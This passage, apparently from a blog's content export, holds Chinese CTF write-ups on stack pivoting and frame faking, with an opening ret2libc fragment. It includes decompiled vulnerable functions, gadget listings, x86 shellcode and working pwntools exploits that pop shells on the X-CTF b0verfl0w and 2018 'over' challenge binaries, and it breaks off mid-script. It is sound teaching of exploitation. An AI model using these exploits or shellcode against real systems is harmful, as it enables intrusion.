class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<span class="comment"># + p64(main_addr)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> RedpwnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花式栈溢出技巧</title>
      <link href="archives/2ddf9dd/"/>
      <url>archives/2ddf9dd/</url>
      
        <content type="html"><![CDATA[<h1 id="花式栈溢出技巧"><a href="#花式栈溢出技巧" class="headerlink" title="花式栈溢出技巧"></a>花式栈溢出技巧</h1><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。</p><blockquote><p>eip 的值是通过 esp 与  ret 指令压入。退出函数时，先执行 leave ，让 esp 指向 ebp ，然后 esp 加一个机器字长后，执行 ret 指令，将 esp 指向的值压入 eip 中。</p></blockquote><p>可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>利用 stack pivoting 有以下几个要求</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针（栈顶指针）。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rsp&#x2F;esp</span><br></pre></td></tr></table></figure><p>当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。</p><blockquote><p>只有是用到了 libc ，编译时 gcc 会将 libc_csu_init  加到程序里。由这个函数也延伸了一种 ROP 技巧：ret2cus</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;7i 0x000000000040061a</span><br><span class="line">0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx</span><br><span class="line">0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp</span><br><span class="line">0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12</span><br><span class="line">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class="line">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class="line">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class="line">0x400624 &lt;__libc_csu_init+100&gt;: ret    </span><br><span class="line">gef➤  x&#x2F;7i 0x000000000040061d</span><br><span class="line">0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp</span><br><span class="line">0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13</span><br><span class="line">0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14</span><br><span class="line">0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15</span><br><span class="line">0x400624 &lt;__libc_csu_init+100&gt;: ret</span><br></pre></td></tr></table></figure><ul><li>存在可以控制内容的内存，一般有如下<ul><li>bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。然而一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li><li>heap。但是这个需要我们能够泄露堆地址。</li></ul></li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以 [X-CTF Quals 2016 - b0verfl0w](<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w) 为例进行介绍。源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+18h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节。</p><p>程序本身并没有开启堆栈保护，所以我们可以在栈上布置 shellcode 并执行。基本利用思路如下</p><ul><li>利用栈溢出布置 shellcode</li><li>控制 eip 指向 shellcode 处</li></ul><p>由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上<strong>相对偏移是固定的</strong>，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only &#x27;jmp|ret&#x27;         </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">0x0804836a : ret</span><br><span class="line">0x0804847e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp</span><br></pre></td></tr></table></figure><p>那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道</p><ul><li>size(shellcode+padding)=0x20</li><li>size(fake ebp)=0x4</li><li>size(0x08048504)=0x4</li></ul><p>所以我们最后一段需要执行的指令就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub esp,0x28</span><br><span class="line">jmp esp</span><br></pre></td></tr></table></figure><p>所以最后的 exp 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;b0verfl0w&#39;)</span><br><span class="line"></span><br><span class="line">shellcode_x86 &#x3D; &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode_x86 +&#x3D; &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode_x86 +&#x3D; &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">sub_esp_jmp &#x3D; asm(&#39;sub esp, 0x28;jmp esp&#39;)</span><br><span class="line">jmp_esp &#x3D; 0x08048504</span><br><span class="line">payload &#x3D; shellcode_x86 + (</span><br><span class="line">    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里补充一下具体程序过程：</p><p>payload 结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp</span><br></pre></td></tr></table></figure><ol><li>首先就是写入 shellcode 、填充、覆盖 ebp ；</li><li>将 eip 覆盖为 <code>jmp esp</code>；eip 是下一条指令存储寄存器。当程序运行 <code>jmp esp</code> 之后，程序运行指针将从 text 段转移到栈上，将栈上的数据当做代码指令运行。这样操作之后，<code>set esp point to shellcode and jmp esp</code> 这一部分栈数据被当做是代码指令执行了。</li><li><code>sub esp,0x28;jmp esp</code> ；将 esp 调整到 shellcode 的开始，当前 esp 和shellcode 的计算看前面；然后再一次 <code>jmp esp</code> ，将运行指针调整到 shellcode 。</li></ol><h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><blockquote><p>也就是栈迁移</p></blockquote><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p><ul><li>控制程序 EIP</li><li>控制程序 EBP</li></ul><p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer padding|fake ebp|leave ret addr|</span><br></pre></td></tr></table></figure><p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p><ul><li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li><li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|target function addr|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure><p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p><p>leave 指令相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp # 将ebp的值赋给esp</span><br><span class="line">pop ebp # 弹出ebp</span><br></pre></td></tr></table></figure><h3 id="控制过程"><a href="#控制过程" class="headerlink" title="控制过程"></a>控制过程</h3><p>仔细说一下基本的控制过程：</p><ol><li>在有栈溢出的程序执行 leave 时，其分为两个步骤<ul><li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li><li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。</li></ul></li><li>执行 ret 指令，会再次执行（溢出写入的） leave ret 指令。</li><li>执行 leave 指令，其分为两个步骤<ul><li>mov esp, ebp ，这会将 esp 指向 ebp2。</li><li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li></ul></li><li>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行<ul><li>push ebp，会将 ebp2 值压入栈中，</li><li>mov ebp, esp，将 ebp 指向当前基地址。</li></ul></li></ol><p>此时的栈结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">ebp2|leave ret addr|arg1|arg2</span><br></pre></td></tr></table></figure><ol><li>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</li><li>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</li></ol><p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似（通过偏移获取栈上地址）。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2018-安恒杯-over"><a href="#2018-安恒杯-over" class="headerlink" title="2018 安恒杯 over"></a>2018 安恒杯 over</h4><p>题目可以在 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/fake_frame/over">ctf-challenge</a> 中找到</p><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><h6 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE</span><br></pre></td></tr></table></figure><p>64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 NX 保护</p><h6 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( sub_400676() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400676</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">96uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read 能读入 96 位, 但 buf 的长度只有 80, 因此只能覆盖 rbp 以及 ret addr 来进行 rop 了</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>当栈溢出长度不够时，可以尝试 frame faking （栈迁移）。这就需要一个能被我们写入、知道地址的内存。这条题目的话，我们只能往栈上写入数据，所以想办法泄露栈地址。</p><h6 id="leak-stack-addr"><a href="#leak-stack-addr" class="headerlink" title="leak stack addr"></a>leak stack addr</h6><p>栈地址每次运行都不一样，需要控制程序来泄露栈地址。这条题目没有开 canary ，然后在 IDA 或者 gdb 分析 sub_400676 的栈结构，发现 buf 覆盖 80 字节之后，就到 rbp 顶，读入的 read 也没有给字符串末尾接上 <code>\x00</code> 的结束符，所以可以将 ebp 的值泄露出来。</p><p>ebp 的值是上一个栈的栈顶，泄露之后通过偏移计算得到 buf 写入的栈地址。gdb 调试后，得出偏移为 0x70</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak ebp</span></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x50</span>)   </span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure><h6 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h6><p>然后就是构造 ROP 链，因为可控写入是在栈上，所以构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROP|padding|fake ebp|leave ret addr|</span><br></pre></td></tr></table></figure><p><code>leave ret addr</code> 就用 ROPgadget 找一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">~$</span><span class="bash"> ROPgadget --binary over.over --only <span class="string">&#x27;leave|ret&#x27;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004006be : leave ; ret</span><br><span class="line">0x0000000000400509 : ret</span><br><span class="line">0x00000000004007d0 : ret 0xfffe</span><br></pre></td></tr></table></figure><p><code>fake ebp</code> 填入 buf 的真实地址。</p><p><code>ROP</code> 两个功能：泄露 libc 地址、ret2text。泄露地址就用常规的 puts 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(sub_addr) <span class="comment"># ret2text</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">payload += p64(leave_ret)</span><br></pre></td></tr></table></figure><h6 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h6><p>泄露地址之后就再一次 frame faking ，只不过这次是执行 <code>system(&quot;/bin/sh&quot;)</code> 。</p><p>但是如果 fake ebp 依旧填写原值会报错，大概原因是因为上面 ROP 是直接调用 sub_400676 ，想比正常情况下压栈的数量和原来不一样，所以要重新计算偏移。</p><p>fake ebp 使用 ROP1 的值时：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> </span></span><br><span class="line">0x00000000004006be in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────[ REGISTERS ]─────</span><br><span class="line">…………</span><br><span class="line"> RBP  0x7fffffffdd50 —▸ 0x7fffffffdd30 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line"> RSP  0x7fffffffdd00 ◂— 0xdeadbeef</span><br><span class="line"> RIP  0x4006be ◂— leave  </span><br></pre></td></tr></table></figure><p>可以看到 RBP 经过两次 leave|ret 之后指向的是 aaaaaaaa ，正常应该是指向 0xdeadbeef 。</p><p>为了让程序执行正确地方，将 fake ebp 的值减 0x30 ，让 ebp 重新指向 0xdeadbeef ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx 0x7fffffffdd30-0x30</span></span><br><span class="line">0x7fffffffdd00:0x00000000deadbeef0x0000000000400793</span><br><span class="line">0x7fffffffdd10:0x00007ffff7b99d570x00007ffff7a52390</span><br><span class="line">0x7fffffffdd20:0x00000000004006760x6161616161616161</span><br><span class="line">0x7fffffffdd30:0x61616161616161610x6161616161616161</span><br><span class="line">0x7fffffffdd40:0x61616161616161610x6161616161616161</span><br><span class="line">0x7fffffffdd50:0x00007fffffffdd300x00000000004006be</span><br><span class="line">0x7fffffffdd60:0x61616161616161610x6161616161616161</span><br><span class="line">0x7fffffffdd70:0x61616161616161610x6161616161616161</span><br><span class="line">0x7fffffffdd80:0x00007fffffffdd300x00000000004006be</span><br><span class="line">0x7fffffffdd90:0x00007fffffffde880x0000000100000000</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">payload += p64(sub_addr) # ret2text</span><br><span class="line">payload = payload.ljust(0x50,&#x27;a&#x27;) # padding</span><br><span class="line">payload += p64(stack)</span><br><span class="line">payload += p64(leave_ret)</span><br></pre></td></tr></table></figure><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p><strong>system(‘/bin/sh’)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sub_addr = <span class="number">0x400676</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ebp</span></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;A&#x27;</span>*<span class="number">0x50</span>)   </span><br><span class="line">stack = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x70</span></span><br><span class="line">log.info(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(sub_addr) <span class="comment"># ret2text</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">payload += p64(sub_addr) <span class="comment"># ret2text</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>execve(“/bin/sh”, 0, 0)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    raw_input(<span class="string">&quot;DEBUG: &quot;</span>)</span><br><span class="line">    gdb.attach(io, cmd)</span><br><span 